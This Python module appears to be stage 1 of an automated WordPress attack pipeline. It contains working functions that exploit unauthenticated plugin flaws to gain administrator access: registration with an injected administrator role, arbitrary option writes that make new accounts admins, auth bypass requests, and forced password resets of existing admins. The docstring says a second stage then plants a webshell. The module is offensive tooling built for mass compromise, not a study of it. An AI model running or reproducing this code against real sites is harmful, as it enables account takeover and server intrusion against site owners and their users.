"""Track B, stage 1 — abuse an unauthenticated flaw to obtain administrator
access, WITHOUT a victim. Four recipe kinds, all fully automatable:

  register-role   : a nopriv registration that honours an attacker role param
                    (e.g. CVE-2026-0920, LA-Studio's lakit_bkrole) → new admin.
  options-update  : arbitrary option write → default_role=administrator +
                    open registration → register lands as admin.
  auth-bypass     : a request that leaves the session authenticated as admin.
  password-reset  : reset a known admin's password to one we choose.

None of these is code execution by itself — each yields an admin *session or
credentials*. Stage 2 (wp_authshell) then plants a webshell. Success is
confirmed downstream by actually logging in / planting, never by trusting the
exploit's HTTP response. Recipe field values are CVE-specific — confirm them
against the PoC (see wp_recipes for the shapes).
"""
import secrets


def _random_creds():
    user = "svc_" + secrets.token_hex(4)
    return {"username": user, "email": f"{user}@mail.invalid",
            "password": secrets.token_hex(12)}


def acquire_admin(base_url, http, recipe, creds=None):
    """Dispatch on recipe['kind']. Returns one of:
      {'username','password'} — caller must log in with these, or
      {'authed': True}        — the session is already an admin, or
      None                    — transport error / unsupported kind."""
    kind = recipe.get("kind", "register-role")
    base = base_url.rstrip("/")
    try:
        if kind in ("register-role", "register-admin"):
            return _register_role(base, http, recipe, creds)
        if kind == "options-update":
            return _options_update(base, http, recipe, creds)
        if kind == "auth-bypass":
            return _auth_bypass(base, http, recipe)
        if kind in ("password-reset", "account-takeover"):
            return _password_reset(base, http, recipe)
    except Exception:
        return None
    return None


def _register_role(base, http, recipe, creds):
    creds = creds or _random_creds()
    data = {
        "action": recipe["action"],
        recipe.get("user_field", "user_login"): creds["username"],
        recipe.get("email_field", "email"): creds["email"],
        recipe.get("pass_field", "password"): creds["password"],
        recipe["role_param"]: recipe.get("role_value", "administrator"),
    }
    http.post(base + recipe["endpoint"], data=data)
    return {"username": creds["username"], "password": creds["password"]}


def _options_update(base, http, recipe, creds):
    # 1. force open registration + admin default role via the option-write bug
    for opt, val in (recipe.get("set_options") or {}).items():
        payload = dict(recipe.get("params", {}))
        payload[recipe.get("option_name_param", "option")] = opt
        payload[recipe.get("option_value_param", "value")] = val
        http.post(base + recipe["endpoint"], data=payload)
    # 2. register — now lands as the default role we just set (administrator)
    creds = creds or _random_creds()
    reg = recipe.get("register_endpoint", "/wp-login.php?action=register")
    data = {recipe.get("user_field", "user_login"): creds["username"],
            recipe.get("email_field", "user_email"): creds["email"]}
    if recipe.get("pass_field"):
        data[recipe["pass_field"]] = creds["password"]
    http.post(base + reg, data=data)
    return {"username": creds["username"], "password": creds["password"]}


def _auth_bypass(base, http, recipe):
    url = base + recipe["endpoint"]
    if recipe.get("method", "GET").upper() == "POST":
        http.post(url, data=recipe.get("params", {}))
    else:
        http.get(url, params=recipe.get("params", {}))
    # the request is expected to leave the session authenticated as admin
    return {"authed": True}


def _password_reset(base, http, recipe):
    target = recipe.get("target_user", "admin")
    newpw = _random_creds()["password"]
    data = dict(recipe.get("params", {}))
    data[recipe.get("user_param", "user_login")] = target
    data[recipe.get("pass_param", "new_password")] = newpw
    http.post(base + recipe["endpoint"], data=data)
    return {"username": target, "password": newpw}
